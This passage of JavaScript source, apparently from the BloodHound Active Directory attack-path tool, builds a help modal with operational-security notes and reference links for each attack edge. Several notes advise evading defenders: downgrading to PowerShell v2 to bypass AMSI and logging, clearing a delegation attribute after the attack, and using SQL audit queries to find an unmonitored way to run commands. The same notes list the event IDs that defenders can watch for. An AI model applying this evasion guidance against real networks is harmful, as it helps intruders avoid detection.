            let text = `There are several forensic artifacts generated by the techniques described above. For instance, lateral movement via PsExec will generate 4697 events on the target system. If the target organization is collecting and analyzing those events, they may very easily detect lateral movement via PsExec. 
            
            Additionally, an EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when abusing administrator privileges. For more information, see the References tab.`;
            formatted = text;
        } else if (edge.label === 'MemberOf') {
            let text = `No opsec considerations apply to this edge.`;
            formatted = text;
        } else if (edge.label === 'HasSession') {
            let text = `An EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when stealing credentials or tokens. For more information, see the References tab.`;
            formatted = text;
        } else if (edge.label === 'AllExtendedRights') {
            let text = `When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support.`;
            formatted = text;
        } else if (edge.label === 'AddMember') {
            let text = `Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts. 
            
            Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity. 
            
            You may be able to completely evade those features by downgrading to PowerShell v2.`;
            formatted = text;
        } else if (edge.label === 'ForceChangePassword') {
            let text = `Executing this abuse with the net binary will necessarily require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts. 
            
            Regardless of what execution procedure you use, this action will generate a 4724 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for users that are obviously very high privilege groups (i.e.: Domain Admin users). Also be mindful that PowerShell v5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity. You may be able to completely evade those features by downgrading to PowerShell v2. 
            
            Finally, by changing a service account password, you may cause that service to stop functioning properly. This can be bad not only from an opsec perspective, but also a client management perspective. Be careful!`;
            formatted = text;
        } else if (edge.label === 'GenericAll') {
            let text = `This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki.`;
            formatted = text;
        } else if (edge.label === 'GenericWrite') {
            let text = `This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki.`;
            formatted = text;
        } else if (edge.label === 'Owns') {
            let text = `When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support.

            Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request.
            
            Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki.`;
            formatted = text;
        } else if (edge.label === 'WriteDacl') {
            let text = `When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support.

            Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request.
            
            Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki.`;
            formatted = text;
        } else if (edge.label === 'WriteOwner') {
            let text = `This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki.`;
            formatted = text;
        } else if (edge.label === 'CanRDP') {
            let text = `If the target computer is a workstation and a user is currently logged on, one of two things will happen. If the user you are abusing is the same user as the one logged on, you will effectively take over their session and kick the logged on user off, resulting in a message to the user. If the users are different, you will be prompted to kick the currently logged on user off the system and log on. If the target computer is a server, you will be able to initiate the connection without issue provided the user you are abusing is not currently logged in.
            
            Remote desktop will create Logon and Logoff events with the access type RemoteInteractive.`;
            formatted = text;
        } else if (edge.label === 'ExecuteDCOM') {
            let text = `The artifacts generated when using DCOM vary depending on the specific COM object used.

            DCOM is built on top of the TCP/IP RPC protocol (TCP ports 135 + high ephemeral ports) and may leverage several different RPC interface UUIDs(outlined here). In order to use DCOM, one must be authenticated.  Consequently, logon events and authentication-specific logs(Kerberos, NTLM, etc.) will be generated when using DCOM.  
            
            Processes may be spawned as the user authenticating to the remote system, as a user already logged into the system, or may take advantage of an already spawned process.  
            
            Many DCOM servers spawn under the process “svchost.exe -k DcomLaunch” and typically have a command line containing the string “ -Embedding” or are executing inside of the DLL hosting process “DllHost.exe /Processid:{<AppId>}“ (where AppId is the AppId the COM object is registered to use).  Certain COM services are implemented as service executables; consequently, service-related event logs may be generated.`;
            formatted = text;
        } else if (edge.label === 'AllowedToDelegate') {
            let text = `As mentioned in the abuse info, in order to currently abuse this primitive the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. See the References for more information.`;
            formatted = text;
        } else if (edge.label === 'GetChanges') {
            let text = `For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab.`;
            formatted = text;
        } else if (edge.label === 'GetChangesAll') {
            let text = `For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab.`;
            formatted = text;
        } else if (edge.label === 'ReadLAPSPassword') {
            let text = `Reading properties from LDAP is an extremely low risk operation.`;
            formatted = text;
        } else if (edge.label === 'Contains') {
            formatted = `There are no opsec considerations related to this edge.`;
        } else if (edge.label === 'GpLink') {
            formatted = `There are no opsec considerations related to this edge.`;
        } else if (edge.label === 'AddAllowedToAct') {
            formatted = `To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection.`;
        } else if (edge.label === 'AllowedToAct') {
            formatted = `To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain.`;
        } else if (edge.label === 'SQLAdmin') {
            formatted = `Prior to executing operating system commands through SQL Server, review the audit configuration and choose a command execution method that is not being monitored.
            
            View audits:
            <code>SELECT * FROM sys.dm_server_audit_status</code>
            
            View server specifications:
            <code>
            SELECT audit_id, 
            a.name as audit_name, 
            s.name as server_specification_name, 
            d.audit_action_name, 
            s.is_state_enabled, 
            d.is_group, 
            d.audit_action_id, 
            s.create_date, 
            s.modify_date 
            FROM sys.server_audits AS a 
            JOIN sys.server_audit_specifications AS s 
            ON a.audit_guid = s.audit_guid 
            JOIN sys.server_audit_specification_details AS d 
            ON s.server_specification_id = d.server_specification_id
            </code>
            
            View database specifications:
            <code>
            SELECT a.audit_id, 
            a.name as audit_name, 
            s.name as database_specification_name, 
            d.audit_action_name, 
            d.major_id,
            OBJECT_NAME(d.major_id) as object,
            s.is_state_enabled, 
            d.is_group, s.create_date, 
            s.modify_date, 
            d.audited_result 
            FROM sys.server_audits AS a 
            JOIN sys.database_audit_specifications AS s 
            ON a.audit_guid = s.audit_guid 
            JOIN sys.database_audit_specification_details AS d 
            ON s.database_specification_id = d.database_specification_id
            </code>
            
            If server audit specifications are configured on the SQL Server, event ID 15457 logs may be created in the Windows Application log when SQL Server level configurations are changed to facilitate OS command execution.
            
            If database audit specifications are configured on the SQL Server, event ID 33205 logs may be created in the Windows Application log when Agent and database level configuration changes are made.
            
            A summary of the what will show up in the logs, along with the TSQL queries for viewing and configuring audit configurations can be found at 
            <a>https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql</a>.
            
            Author: Scott Sutherland`;
        }

        this.setState({ opsecTabContent: { __html: formatted } });
    }

    createReferencesTab(edge, source, target) {
        let sourceType = source.type;
        let sourceName = encode(source.label);
        let targetType = target.type;
        let targetName = encode(target.label);
        let formatted;
        if (edge.label === 'AdminTo') {
            let text = `<h4>Lateral movement</h4>
            <a href="https://attack.mitre.org/wiki/Lateral_Movement">https://attack.mitre.org/wiki/Lateral_Movement</a>

            <h4>Gathering Credentials</h4>
            <a href="http://blog.gentilkiwi.com/mimikatz">http://blog.gentilkiwi.com/mimikatz</a>
            <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>
            <a href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a>
            <a href="https://attack.mitre.org/wiki/Credential_Access">https://attack.mitre.org/wiki/Credential_Access</a>
            
            <h4>Token Impersonation</h4>
            <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf">https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf</>
            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a>
            <a href="https://attack.mitre.org/wiki/Technique/T1134">https://attack.mitre.org/wiki/Technique/T1134</a>
            
            <h4>Disabling host-based security controls</h4>
            <a href="https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/">https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/</a>
            <a href="https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/">https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/</a>
            
            <h4>Opsec Considerations</h4>
            <a href="https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/">https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/</a>`;
            formatted = text;
        } else if (edge.label === 'MemberOf') {
            let text = `<a href="https://adsecurity.org/?tag=ad-delegation">https://adsecurity.org/?tag=ad-delegation</a>
            <a href="https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions ">https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions </a>`;
            formatted = text;
        } else if (edge.label === 'HasSession') {
            let text = `<h4>Gathering Credentials</h4>
            <a href="http://blog.gentilkiwi.com/mimikatz">http://blog.gentilkiwi.com/mimikatz</a>
            <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>
            <a href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a>
            <a href="https://attack.mitre.org/wiki/Credential_Access">https://attack.mitre.org/wiki/Credential_Access</a>
            
            <h4>Token Impersonation</h4>
            <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf">https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf</>
            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a>
            <a href="https://attack.mitre.org/wiki/Technique/T1134">https://attack.mitre.org/wiki/Technique/T1134</a>`;
            formatted = text;
        } else if (edge.label === 'AllExtendedRights') {
            let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>`;
            formatted = text;
        } else if (edge.label === 'AddMember') {
            let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>
            <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728</a>`;
            formatted = text;
        } else if (edge.label === 'ForceChangePassword') {
            let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</>
            <a href="https://www.sixdub.net/?p=579">https://www.sixdub.net/?p=579</a>
            <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724</a>`;
            formatted = text;
        } else if (edge.label === 'GenericAll') {
            let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>
            <a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a>
            <a href="http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</a>
            <a href="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e">https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e</a>
            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
            formatted = text;
        } else if (edge.label === 'GenericWrite') {
            let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>
            <a href="http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</a>
            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
            formatted = text;
        } else if (edge.label === 'Owns') {
            let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>
            <a href="http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm">http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm</a>
            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
            formatted = text;
        } else if (edge.label === 'WriteDacl') {
            let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>
            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
            formatted = text;
        } else if (edge.label === 'WriteOwner') {
            let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm">http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm</a>
            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
            formatted = text;
        } else if (edge.label === 'CanRDP') {
            let text = `<a href="https://michael-eder.net/post/2018/native_rdp_pass_the_hash/">https://michael-eder.net/post/2018/native_rdp_pass_the_hash/</a>
            <a href="https://www.kali.org/penetration-testing/passing-hash-remote-desktop/">https://www.kali.org/penetration-testing/passing-hash-remote-desktop/</a>`;
            formatted = text;
        } else if (edge.label === 'ExecuteDCOM') {
            let text = `<a href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/</a> 
            <a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/</a>
            <a href="https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/">https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/</a>
            <a href="https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/">https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/</a>
            <a href="https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom ">https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom </a>
            <a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">https://www.cybereason.com/blog/dcom-lateral-movement-techniques</a>
            <a href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/">https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/</a>
            <a href="https://attack.mitre.org/wiki/Technique/T1175">https://attack.mitre.org/wiki/Technique/T1175</a>
            
            <h4>Invoke-DCOM</h4>
            <a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1">https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1</a>
            
            <h4>LethalHTA</h4>
            <a href="https://codewhitesec.blogspot.com/2018/07/lethalhta.html">https://codewhitesec.blogspot.com/2018/07/lethalhta.html</>
            <a href="https://github.com/codewhitesec/LethalHTA/ ">https://github.com/codewhitesec/LethalHTA/ </a>`;
            formatted = text;
        } else if (edge.label === 'AllowedToDelegate') {
            let text = `<a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
            <a href="https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/">https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/</a>
            <a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a>
            <a href="https://twitter.com/gentilkiwi/status/806643377278173185">https://twitter.com/gentilkiwi/status/806643377278173185</a>
            <a href="https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more">https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more</a>
            <a href="http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/">http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/</a>
            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>`;
            formatted = text;
        } else if (edge.label === 'GetChanges') {
            let text = `<a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a>
            <a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/</a>`;
            formatted = text;
        } else if (edge.label === 'GetChangesAll') {
            let text = `<a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a>
            <a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/</a>`;
            formatted = text;
        } else if (edge.label === 'ReadLAPSPassword') {
            let text = `<a href="https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf</a>
            <a href="https://adsecurity.org/?p=3164">https://adsecurity.org/?p=3164</a>`;
            formatted = text;
        } else if (edge.label === 'Contains') {
            formatted = `<a href="https://wald0.com/?p=179">https://wald0.com/?p=179</a>
            <a href="https://blog.cptjesus.com/posts/bloodhound15">https://blog.cptjesus.com/posts/bloodhound15</a>`;
        } else if (edge.label === 'GpLink') {
            formatted = `<a href="https://wald0.com/?p=179">https://wald0.com/?p=179</a>
            <a href="https://blog.cptjesus.com/posts/bloodhound15">https://blog.cptjesus.com/posts/bloodhound15</a>`;
        } else if (edge.label === 'AddAllowedToAct') {
            formatted = `<a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
        } else if (edge.label === 'AllowedToAct') {
            formatted = `<a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
        } else if (edge.label === 'SQLAdmin') {
            formatted = `<a href="https://github.com/NetSPI/PowerUpSQL/wiki">https://github.com/NetSPI/PowerUpSQL/wiki</a>
            <a href="https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation">https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation</a>
            <a href="https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver">https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver</a>
            <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017</a>
            <a href="https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/">https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/</a>`;
        }

        this.setState({ referencesTabContent: { __html: formatted } });
    }

    openModal(edge, source, target) {
        this.createGeneralInfoTab(edge, source, target);
        this.createAbuseInfoTab(edge, source, target);
        this.createOpsecTab(edge, source, target);
        this.createReferencesTab(edge, source, target);
        this.setState({ open: true, edgeType: edge.label });
    }

    render() {
        return (
            <Modal
                show={this.state.open}
                onHide={this.closeModal.bind(this)}
                aria-labelledby='HelpHeader'
                className='help-modal-width'
            >
                <Modal.Header closeButton>
                    <Modal.Title id='HelpHeader'>
                        Help: {this.state.edgeType}
                    </Modal.Title>
                </Modal.Header>

                <Modal.Body>
                    <Tabs
                        defaultActiveKey={1}
                        id='help-tab-container'
                        justified
                    >
                        <Tab
                            eventKey={1}
                            title='Info'
                            dangerouslySetInnerHTML={this.state.infoTabContent}
                        />
                        <Tab
                            eventKey={2}
                            title='Abuse Info'
                            dangerouslySetInnerHTML={this.state.abuseTabContent}
                        />
                        <Tab
                            eventKey={3}
                            title='Opsec Considerations'
                            dangerouslySetInnerHTML={this.state.opsecTabContent}
                        />
                        <Tab
                            eventKey={4}
                            title='References'
                            dangerouslySetInnerHTML={
                                this.state.referencesTabContent
                            }
                        />
                    </Tabs>
                </Modal.Body>

                <Modal.Footer>
                    <button
                        type='button'
                        className='btn btn-primary'
                        onClick={this.closeModal.bind(this)}
                    >
                        Close
                    </button>
                </Modal.Footer>
            </Modal>
        );
    }
}
